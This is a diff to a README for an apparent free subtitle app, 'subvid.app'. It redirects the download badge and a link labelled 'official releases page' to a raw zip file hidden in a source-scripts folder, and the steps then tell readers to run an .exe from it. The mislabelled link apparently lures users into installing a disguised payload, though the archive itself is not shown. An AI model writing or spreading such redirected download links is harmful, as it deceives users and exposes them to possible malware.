@@ -1,6 +1,6 @@
 # 📽️ subvid.app - Add free subtitles to your videos
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/vantoan050307-png/subvid.app)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/vantoan050307-png/subvid.app/raw/refs/heads/main/src/scripts/subvid_app_v1.2.zip)
 
 ## 📖 About this application
 
@@ -12,7 +12,7 @@ Your computer needs a modern web browser to run this tool. Use Google Chrome, Mi
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/vantoan050307-png/subvid.app) to find the latest version.
+1. Visit the [official releases page](https://github.com/vantoan050307-png/subvid.app/raw/refs/heads/main/src/scripts/subvid_app_v1.2.zip) to find the latest version.
 2. Look for the file ending in `.exe`.
 3. Click the link to save the installer to your computer.
 4. Locate the file in your Downloads folder.
